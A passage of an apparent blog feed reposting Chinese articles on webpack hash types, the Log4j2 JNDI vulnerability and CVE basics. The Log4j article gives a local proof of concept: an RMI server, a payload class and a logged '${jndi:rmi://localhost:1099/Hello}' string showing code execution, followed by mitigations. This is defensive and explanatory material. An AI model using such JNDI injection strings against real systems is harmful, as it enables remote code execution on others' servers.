        <content type="html"><![CDATA[<p>[转]<a href="https://www.1024sou.com/article/289015.html">webpack 中，hash、chunkhash、contenthash 的区别是什么？</a><br>Webpack 有非常多的概念，很多名词长得都差不多。我把这些分散在文档和教程里的内容总结起来，写了一份 webpack 中的易混淆知识点，目前看是全网独一份，大家可以加个收藏，方便以后检索和学习。</p><p>全集链接 ?? webpack 易混淆知识点</p><p>首先来个背景介绍，哈希一般是结合 CDN 缓存来使用的。如果文件内容改变的话，那么对应文件哈希值也会改变，对应的 HTML 引用的 URL 地址也会改变，触发 CDN 服务器从源服务器上拉取对应数据，进而更新本地缓存。</p><h1 id="1-hash"><a href="#1-hash" class="headerlink" title="1 hash"></a>1 hash</h1><p>hash 计算是跟整个项目的构建相关，我们做一个简单的 demo。</p><p>沿用案例 1 的 demo 代码，文件目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">src&#x2F;</span><br><span class="line">├── index.css</span><br><span class="line">├── index.html</span><br><span class="line">├── index.js</span><br><span class="line">└── utils.js</span><br></pre></td></tr></table></figure><p>webpack 的核心配置如下（省略了一些 module 配置信息）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        index: &quot;..&#x2F;src&#x2F;index.js&quot;,</span><br><span class="line">        utils: &#39;..&#x2F;src&#x2F;utils.js&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: &quot;[name].[hash].js&quot;,  &#x2F;&#x2F; 改为 hash</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">    plugins: [</span><br><span class="line">        new MiniCssExtractPlugin(&#123;</span><br><span class="line">            filename: &#39;index.[hash].css&#39; &#x2F;&#x2F; 改为 hash</span><br><span class="line">        &#125;),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的文件名如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-bb5b247537653773.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我们可以发现，生成文件的 hash 和项目的构建 hash 都是一模一样的。</p><h1 id="2-chunkhash"><a href="#2-chunkhash" class="headerlink" title="2 chunkhash"></a>2 chunkhash</h1><p>因为 hash 是项目构建的哈希值，项目中如果有些变动，hash 一定会变，比如说我改动了 utils.js 的代码，index.js 里的代码虽然没有改变，但是大家都是用的同一份 hash。hash 一变，缓存一定失效了，这样子是没办法实现 CDN 和浏览器缓存的。</p><p>chunkhash 就是解决这个问题的，它根据不同的入口文件(Entry)进行依赖文件解析、构建对应的 chunk，生成对应的哈希值。</p><p>我们再举个例子，我们对 utils.js 里文件进行改动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">export function square(x) &#123;</span><br><span class="line">    return x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 增加 cube() 求立方函数</span><br><span class="line">export function cube(x) &#123;</span><br><span class="line">    return x * x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把 webpack 里的所有 hash 改为 chunkhash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        index: &quot;..&#x2F;src&#x2F;index.js&quot;,</span><br><span class="line">        utils: &#39;..&#x2F;src&#x2F;utils.js&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: &quot;[name].[chunkhash].js&quot;, &#x2F;&#x2F; 改为 chunkhash</span><br><span class="line">    &#125;,</span><br><span class="line">          </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">    plugins: [</span><br><span class="line">        new MiniCssExtractPlugin(&#123;</span><br><span class="line">            filename: &#39;index.[chunkhash].css&#39; &#x2F;&#x2F; &#x2F;&#x2F; 改为 chunkhash</span><br><span class="line">        &#125;),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构建结果如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-3a80907ce97b2e8e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我们可以看出，chunk 0 的 hash 都是一样的，chunk 1 的 hash 和上面的不一样。</p><p>假设我又把 utils.js 里的 cube() 函数去掉，再打包：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-9a3240fa9f2a69fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>对比可以发现，只有 chunk 1 的 hash 发生变化，chunk 0 的 hash 还是原来的。</p><h1 id="3-contenthash"><a href="#3-contenthash" class="headerlink" title="3 contenthash"></a>3 contenthash</h1><p>我们更近一步，index.js 和 index.css 同为一个 chunk，如果 index.js 内容发生变化，但是 index.css 没有变化，打包后他们的 hash 都发生变化，这对 css 文件来说是一种浪费。如何解决这个问题呢？</p><p>contenthash 将根据资源内容创建出唯一 hash，也就是说文件内容不变，hash 就不变。</p><p>我们修改一下 webpack 的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        index: &quot;..&#x2F;src&#x2F;index.js&quot;,</span><br><span class="line">        utils: &#39;..&#x2F;src&#x2F;utils.js&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: &quot;[name].[chunkhash].js&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line">      </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">    plugins: [</span><br><span class="line">        new MiniCssExtractPlugin(&#123;</span><br><span class="line">            filename: &#39;index.[contenthash].css&#39; &#x2F;&#x2F; 这里改为 contenthash</span><br><span class="line">        &#125;),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们对 index.js 文件做了 3 次修改（就是改了改 log 函数的输出内容，过于简单就先不写了），然后分别构建，结果截图如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-6810ecb7c427c002.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-f05919f63d56b4a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-d818fe7730fb163b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我们可以发现，css 文件的 hash 都没有发生改变。</p><h1 id="4-一句话总结："><a href="#4-一句话总结：" class="headerlink" title="4 一句话总结："></a>4 一句话总结：</h1><ul><li><p>hash 计算与整个项目的构建相关；</p></li><li><p>chunkhash 计算与同一 chunk 内容相关；</p></li><li><p>contenthash 计算与文件内容本身相关。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> React &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入分析Log4j 漏洞</title>
      <link href="/2022/05/03/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90Log4j-%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/05/03/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90Log4j-%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://juejin.cn/post/7042310323151306759">深入分析Log4j 漏洞</a><br><img src="https://upload-images.jianshu.io/upload_images/15531792-2639f6212e70d3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>几乎每个系统都会使用日志框架，用于记录日志信息，这些信息可以提供程序运行的上下文，但是日志过多也会影响系统的性能，所以好的日志框架应该是可靠，快速和可扩展的。<br>Apache Log4j2 是一个基于 Java 的日志工具，是Log4j的升级版本，引入了很多丰富的特性，包括高性能，低垃圾收集，插件系统等。目前很多互联网公司以及耳熟能详的公司的系统或者开源框架都在使用Log4j2。<br>2021.12.7，Log4j首次被发现了一个非常严重的漏洞，在当天Log4j就发布了log4j-2.15.0-rc1，但是12.9那天被发现这个版本仍然可以触发漏洞。简单点说，黑客可以恶意构造特殊数据请求包payload触发漏洞，从而可以在目标服务器上执行任意代码，导致服务器被黑客控制，被定性为“过去十年来最大、最关键的漏洞”。<br>根据目前统计，90%以上基于java开发的应用平台都会受到影响。那么这篇文章就会深入分析这个漏洞究竟是怎么产生的以及怎么修复它。</p><h1 id="1-Log4j简介"><a href="#1-Log4j简介" class="headerlink" title="1. Log4j简介"></a>1. Log4j简介</h1><p>Apache Log4j 是一个基于<a href="https://link.juejin.cn/?target=https://zh.wikipedia.org/wiki/Java" title="https://zh.wikipedia.org/wiki/Java">Java</a>的日志记录工具。它是由Ceki Gülcü首创的，现在已经发展为<a href="https://link.juejin.cn/?target=https://zh.wikipedia.org/wiki/Apache%25E8%25BD%25AF%25E4%25BB%25B6%25E5%259F%25BA%25E9%2587%2591%25E4%25BC%259A" title="https://zh.wikipedia.org/wiki/Apache%E8%BD%AF%E4%BB%B6%E5%9F%BA%E9%87%91%E4%BC%9A">Apache软件基金会</a>的项目之一。</p><p>经过多年的开发迭代，Log4j 1.x的维护已经变得非常困难，因为它需要与非常旧的 Java 版本兼容，所以于 2015 年 8 月正式升级为Log4j2。</p><h1 id="2-Log4j的lookup功能"><a href="#2-Log4j的lookup功能" class="headerlink" title="2. Log4j的lookup功能"></a>2. Log4j的lookup功能</h1><p>本次漏洞是因为Log4j2组件中 lookup功能的实现类 JndiLookup 的设计缺陷导致，这个类存在于log4j-core-xxx.jar中。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-9698512c59b60595.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安全漏洞的类"><br>log4j的<a href="https://link.juejin.cn/?target=https://logging.apache.org/log4j/2.x/manual/lookups.html" title="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookups</a>功能可以快速打印包括运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。比如我们打印Java运行时版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerabilityTest &#123;</span><br><span class="line">    private static final Logger LOGGER &#x3D; LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        LOGGER.error(&quot;Test:&#123;&#125;&quot;,&quot;$&#123;java:runtime&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20:20:21.312 [main] ERROR com.ldbmcs.VulnerabilityTest - OpenJDK Runtime Environment (build 11.0.11+9) from AdoptOpenJDK</span><br></pre></td></tr></table></figure><p>那么<code>JndiLookup</code>到底有什么设计缺陷导致出现的史诗级漏洞呢？</p><p>我们首先把目标放在<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public void format(final LogEvent event, final StringBuilder toAppendTo) &#123;</span><br><span class="line">        Message msg &#x3D; event.getMessage();</span><br><span class="line">        if (msg instanceof StringBuilderFormattable) &#123;</span><br><span class="line">            boolean doRender &#x3D; this.textRenderer !&#x3D; null;</span><br><span class="line">            StringBuilder workingBuilder &#x3D; doRender ? new StringBuilder(80) : toAppendTo;</span><br><span class="line">            int offset &#x3D; workingBuilder.length();</span><br><span class="line">            if (msg instanceof MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">                ((MultiFormatStringBuilderFormattable)msg).formatTo(this.formats, workingBuilder);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (this.config !&#x3D; null &amp;&amp; !this.noLookups) &#123;</span><br><span class="line">                for(int i &#x3D; offset; i &lt; workingBuilder.length() - 1; ++i) &#123;</span><br><span class="line">                    if (workingBuilder.charAt(i) &#x3D;&#x3D; &#39;$&#39; &amp;&amp; workingBuilder.charAt(i + 1) &#x3D;&#x3D; &#39;&#123;&#39;) &#123;</span><br><span class="line">                        String value &#x3D; workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       ...</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">      ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们传入的message会通过<code>MessagePatternConverter.format()</code>，判断如果<code>config</code>存在并且<code>noLookups</code>为false（默认为false），然后匹配到<code>$&#123;</code>则通过<code>getStrSubstitutor()</code>替换原有的字符串，比如这里的<code>$&#123;java:runtime&#125;</code>。<br>因为这里没有任何的白名单，那么我们就可以构造任何的字符串，只有符合<code>$&#123;</code>就可以。<br>继续往下走，来到<code>org.apache.logging.log4j.core.lookup.Interpolator#lookup</code><br><img src="https://upload-images.jianshu.io/upload_images/15531792-bb9eac64db411298.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="lookup 函数"><br>我们可以看到处理<code>event</code>的时候根据前缀选择对应的<code>StrLookup</code>进行处理，目前支持date，jndi，java，main等多种类型，如果构造的event是jndi，则通过JndiLoopup进行处理，从而构造漏洞。</p><h1 id="3-Log4j-漏洞"><a href="#3-Log4j-漏洞" class="headerlink" title="3. Log4j 漏洞"></a>3. Log4j 漏洞</h1><p>受影响的版本：</p><p>2.0-beta9 &lt;= Apache Log4j &lt;= 2.15.0-rc1</p><blockquote><p>Log4j 1.x不受此漏洞影响。</p></blockquote><p>受影响的框架或者组件：</p><ul><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><h1 id="4-Log4j-漏洞复现"><a href="#4-Log4j-漏洞复现" class="headerlink" title="4. Log4j 漏洞复现"></a>4. Log4j 漏洞复现</h1><p>我们以<a href="https://link.juejin.cn/?target=https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html" title="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html">RMI</a>服务为例复现Log4j的漏洞，RMI是远程方法调用(Remote Method Invocation)，能够让A电脑的java虚拟机上的对象调用B电脑的java 虚拟机中的对象上的方法。但是客户端并不是直接调用服务器上的方法的，而是会借助<strong>存根 (stub)</strong> 充当我们客户端的代理，来访问服务端，同时<strong>骨架 (Skeleton)</strong> 是另一个代理，它与真实对象一起在服务端上，骨架将接受到的请求交给服务器来处理，服务器处理完成之后将结果进行打包发送至存根 ，然后存根将结果进行解包之后的结果发送给客户端。</p><p>RMI包括三个部分：</p><ul><li>Registry：提供服务注册与服务获取。即Server端向Registry注册服务，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li><li>Server： 远程方法的提供者，并向Registry注册自身提供的服务。</li><li>Client:：远程方法的消费者，从Registry获取远程方法的相关信息并且调用。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3df7921b424b5d42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="流程图"><br>OKveDJ</li></ul><p>创建<code>Server</code>类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry &#x3D; LocateRegistry.createRegistry(1099);</span><br><span class="line">            ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(new Reference(&quot;com.ldbmcs.rmi.RmiExecute&quot;, &quot;com.ldbmcs.rmi.RmiExecute&quot;, null));</span><br><span class="line">            registry.bind(&quot;Hello&quot;, referenceWrapper);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;Server Exception: &quot; + e);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class RmiExecute &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.println(&quot;Hello, World&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着，我们在测试类<code>VulnerabilityTest</code>中修改代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerabilityTest &#123;</span><br><span class="line">    private static final Logger LOGGER &#x3D; LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String test &#x3D; &quot;$&#123;jndi:rmi:&#x2F;&#x2F;localhost:1099&#x2F;Hello&#125;&quot;;</span><br><span class="line">        LOGGER.error(&quot;Test:&#123;&#125;&quot;, test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别启动<code>RMIServer</code>和<code>VulnerabilityTest</code>，我们可以看到在<code>VulnerabilityTest</code>中打印出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, World</span><br></pre></td></tr></table></figure><p>也就是说，我们可以在目标服务器中执行任意代码，影响不言而喻。</p><p>那么怎么解决呢？</p><h1 id="5-Log4j-漏洞修复"><a href="#5-Log4j-漏洞修复" class="headerlink" title="5. Log4j 漏洞修复"></a>5. Log4j 漏洞修复</h1><ol><li><p>设置jvm参数：<code>-Dlog4j2.formatMsgNoLookups=true</code></p></li><li><p>设置系统环境变量：<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code></p></li><li><p>升级版本：<a href="https://logging.apache.org/log4j/2.x/download.html">官方</a>，最新的版本仅支持java, ldap, 和 ldaps，同时默认禁用JNDI等等功能去限制利用构造payload去触发漏洞。</p><ul><li>Java 8及之后的版本升级到 v2.16.0。(后续还有2.17版本)</li><li>Java 7 升级到 v2.12.2。</li><li>其他版本，删除<code>JndiLookup</code>类：<code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是CVE？</title>
      <link href="/2022/05/03/%E4%BB%80%E4%B9%88%E6%98%AFCVE%EF%BC%9F/"/>
      <url>/2022/05/03/%E4%BB%80%E4%B9%88%E6%98%AFCVE%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.redhat.com/zh/topics/security/what-is-cve">[RedHat]什么是 CVE?</a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CVE 是通用漏洞披露（Common Vulnerabilities and Exposures）的英文缩写，列出了已公开披露的各种计算机安全缺陷。人们提到 CVE，指的都是已分配 CVE ID 编号的安全缺陷。</p><p>供应商和研究人员发布的安全公告几乎总会提到至少一个 CVE ID。CVE 可以帮助 IT 专业人员协调自己的工作，轻松地确定漏洞的优先级并加以处理，从而提高计算机系统的安全性。</p><h1 id="CVE-系统的工作原理"><a href="#CVE-系统的工作原理" class="headerlink" title="CVE 系统的工作原理"></a>CVE 系统的工作原理</h1><p>CVE 由 <a href="https://cve.mitre.org/">MITRE corporation</a> 监管，由美国国土安全部下属的网络安全和基础设施安全局提供资金。</p><p>CVE 条目非常简短。条目中既没有技术数据，也不包含与风险、影响和修复有关的信息。这些详细信息会收录在其他数据库中，包括<a href="https://nvd.nist.gov/">美国国家漏洞数据库（NVD）</a>、<a href="https://www.kb.cert.org/vuls/">CERT/CC 漏洞注释数据库</a>以及由供应商和其他组织维护的各种列表。通过 CVE ID，用户就能跨上述不同系统来简便地识别同一个安全缺陷。</p><h4 id="关于-CVE-识别号"><a href="#关于-CVE-识别号" class="headerlink" title="关于 CVE 识别号"></a>关于 CVE 识别号</h4><p>CVE 识别号由 CVE 编号管理机构（CNA）分配。全球目前<a href="https://cve.mitre.org/cve/request_id.html">约有 100 个 CNA</a>，包括各大 IT 供应商以及安全公司和研究组织。MITRE 也可以直接发布 CVE。</p><p>MITRE 向每个 CNA 发放了一个 CVE 编号池，用于在发现新问题时将编号连接至新问题。每年，都有数以千计的 <a href="https://www.cvedetails.com/browse-by-date.php">CVE ID</a> 发放出来。单个复杂产品（如操作系统）可能会累积数百个 CVE。</p><p>任何人都可以从任何地方进行 CVE 报告。无论是供应商、研究人员或是机敏的用户，都有可能发现缺陷，并促使他人予以关注。很多供应商都会提供<a href="https://en.wikipedia.org/wiki/Bug_bounty_program">错误报告奖励</a>，以鼓励相关人员负责任地披露各种安全缺陷。如果您发现了<a href="https://www.redhat.com/zh/topics/open-source/what-is-open-source-software">开源软件</a>存在漏洞，您应该将其<a href="https://opensource.com/article/19/3/bug-reporting">提交至相关社区</a>。</p><p>再通过种种渠道，该缺陷的相关信息最终会传至 CNA。CNA 进而会为这些信息分配 CVE ID，然后编写简短描述并附上参考资料。然后，CVE 条目就会被发布 CVE 网站上。</p><p><code>通常会在公开安全公告之前分配 CVE ID。供应商一般会对安全缺陷保密，直至相关修复已完成开发和测试。这样可以降低未修补漏洞被攻击的风险。</code></p><p>公布时，CVE 条目中会包含 CVE ID（格式为“cve-2019-1234567”）、安全漏洞的简短描述和相关的参考资料（可能包括漏洞报告和公告的链接）。</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>CVE对每一个漏洞都赋予一个专属的编号，格式如下：</p><ul><li>CVE-YYYY-NNNN</li></ul><p>CVE为固定的前缀字，YYYY为<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%85%83%E7%BA%AA%E5%B9%B4" title="西元纪年">西元纪年</a>，NNNN为流水编号。NNNN原则上为四位数字，不足四位时前面补0。从2014年开始，必要时可编到五位数或更多位数。由于CVE有很多个编号机构，每个编号机构使用的号段并不相同，因此NNNN可能并不连续。</p><p>以2014年发现的<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E" title="心脏出血漏洞">心脏出血漏洞</a>为例，其编号为CVE-2014-0160。</p><h1 id="什么样的缺陷才算-CVE？"><a href="#什么样的缺陷才算-CVE？" class="headerlink" title="什么样的缺陷才算 CVE？"></a>什么样的缺陷才算 CVE？</h1><p>只有满足一系列特定条件的缺陷才会分配 CVE ID。这些缺陷必须满足以下条件：</p><ol><li><p>可以单独修复。<br>该缺陷可以独立于所有其他错误进行修复。</p></li><li><p>已得到相关供应商的确认或已记录在案。<br>软件或硬件供应商已确认错误，并承认其会对安全性造成负面影响。或者，报告者本应共享一份相关漏洞报告，表明错误会造成负面影响，且有悖于受影响系统的安全策略。</p></li><li><p>会影响某个代码库。<br>如果缺陷会对多个产品造成影响，则会获得单独的 CVE。对于共享的库、协议或标准，只有在使用共享代码会容易受到攻击时，该缺陷才会获得单个 CVE。否则，每个受影响的代码库或产品都会获得一个唯一的 CVE。</p></li></ol><p>采编自 <a href="https://cve.mitre.org/cve/cna/rules.html#Section_4_1_qualifications">https://cve.mitre.org/cve/cna/rules.html#Section_4_1_qualifications</a></p><h1 id="什么是通用漏洞评分系统？"><a href="#什么是通用漏洞评分系统？" class="headerlink" title="什么是通用漏洞评分系统？"></a>什么是通用漏洞评分系统？</h1><p>漏洞的严重性可以通过多种方式来评估。其中的一种就是使用<a href="https://www.first.org/cvss/">通用漏洞评分系统（CVSS）</a>，这是一组用于为漏洞分配数值以评估其严重性的开放标准。NVD、CERT 等机构会使用 CVSS 评分来评估漏洞的影响。评分范围为 0.0 到 10.0，数值越大代表漏洞越严重。许多安全供应商也都创建了自己的评分系统。</p><h5 id="三大核心要点"><a href="#三大核心要点" class="headerlink" title="三大核心要点"></a><strong>三大核心要点</strong></h5><p><strong>了解自己的部署情况。</strong>存在 CVE 并不意味着您的特定环境和部署正面临风险。请务必查看各个 CVE，并验证 CVE 是否适用于（或部分适用于）您的特有环境中所用的操作系统、应用、模块和配置，确定 CVE 是否适用于您的环境。</p><p><strong>开展漏洞管理。</strong><a href="https://en.wikipedia.org/wiki/Vulnerability_management">漏洞管理</a>是一个可重复的过程，用于识别、分类、确定优先级、补救和解决漏洞。您要清楚自己的组织会如何遭遇风险，才能正确地为有待解决的所有重要漏洞确定优先级。</p><p><strong>做好沟通准备。</strong>CVE 将会影响到您所在组织使用的系统，不仅漏洞本身，还因为修复漏洞可能会需要停机。您应及时与您的内部客户进行沟通和协调，并将漏洞的相关信息分享给您所在组织中的任意中央风险管理职能部门。</p><h3 id="红帽如何处理-CVE"><a href="#红帽如何处理-CVE" class="headerlink" title="红帽如何处理 CVE"></a>红帽如何处理 CVE</h3><p>作为<a href="https://www.redhat.com/zh/topics/open-source/what-is-open-source">开源</a>软件的主要贡献者，红帽一直致力于推动安全社区的发展。红帽是 <a href="https://cve.mitre.org/cve/cna.html">CVE 编号管理机构</a>（CNA）之一，使用 CVE ID 来跟踪安全漏洞。红帽安全部门维护了一个开放且经常更新的<a href="https://access.redhat.com/security/security-updates/#/cve">安全更新数据库</a>，您可以按 CVE 编号查看这个数据库。</p><h1 id="什么是红帽安全数据-API？"><a href="#什么是红帽安全数据-API？" class="headerlink" title="什么是红帽安全数据 API？"></a>什么是红帽安全数据 API？</h1><p>红帽产品安全部在其<a href="https://www.redhat.com/security/data/metrics/">安全数据页面</a>提供对原始安全数据的访问权限，并以机器可读格式提供安全数据 API。</p><p>除了红帽生成的安全报告和指标外，客户也可使用这些原始数据针对自己的独特情况生成自用指标。</p><p>安全数据 API 提供的数据包括 OVAL（开放漏洞和评估语言）定义、通用漏洞报告框架（CVRF）文件和 CVE 数据。数据通过 XML 或 JSON 格式提供。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件设计的几个原则</title>
      <link href="/2022/04/23/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%87%A0%E4%B8%AA%E5%8E%9F%E5%88%99/"/>
      <url>/2022/04/23/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%87%A0%E4%B8%AA%E5%8E%9F%E5%88%99/</url>
      
